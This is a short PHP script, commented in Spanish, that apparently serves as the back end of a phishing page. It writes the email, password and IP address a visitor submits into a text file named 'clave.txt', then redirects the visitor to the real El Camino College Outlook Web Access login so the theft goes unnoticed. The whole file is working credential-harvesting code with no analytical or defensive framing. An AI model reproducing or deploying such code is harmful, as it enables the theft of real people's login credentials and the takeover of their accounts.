<?php
$correo = $_POST[ 'email' ]; 
$contraseña = $_POST[ 'pass' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
 
if( ( empty($correo)) or (empty($contraseña)) ){
    header('location: index.htm');
}else{  
        //guarderemos en un archivo de texto
        $file = fopen('clave.txt','a+');
        fwrite($file, "correo: ".$correo."\r\ncontraseña: ".$contraseña."\r\nIP: ".$ip."\r\n=========================\r\n");
        fclose($file);
        header('location:https://mail.elcamino.edu/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.elcamino.edu%2fowa%2f');      
        
}
?>